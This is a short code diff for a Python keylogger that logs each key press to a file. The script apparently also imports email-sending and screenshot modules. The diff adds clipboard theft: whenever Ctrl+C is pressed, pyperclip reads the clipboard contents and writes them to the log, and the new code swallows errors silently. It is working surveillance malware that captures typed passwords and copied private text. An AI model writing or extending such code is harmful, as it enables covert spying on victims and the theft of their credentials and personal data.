@@ -4,6 +4,8 @@ import data
 import threading
 import email_send
 import ss
+import pyperclip
+
 
 mouse_click = 0
 last_key = 0
@@ -30,11 +32,14 @@ def OnKeyPress(key):
 	global mouse_click
 	global last_key 
 	with open(log_file, 'a') as f:
-		#if key == pynput.keyboard.Key.ctrl:
-		if key.char == 'c':
-			print('Success')
-		f.write(f"{key} \n")
+		try:
+			if last_key == pynput.keyboard.Key.ctrl and key.char == 'c':
+				f.write(f"Clipboard - {pyperclip.paste()} \n")
+		except:
+			pass
+		f.write(f"{key} \n")	
 		mouse_click = 0
+		last_key = key
 
 def OnKeyRelease(key):
 	pass
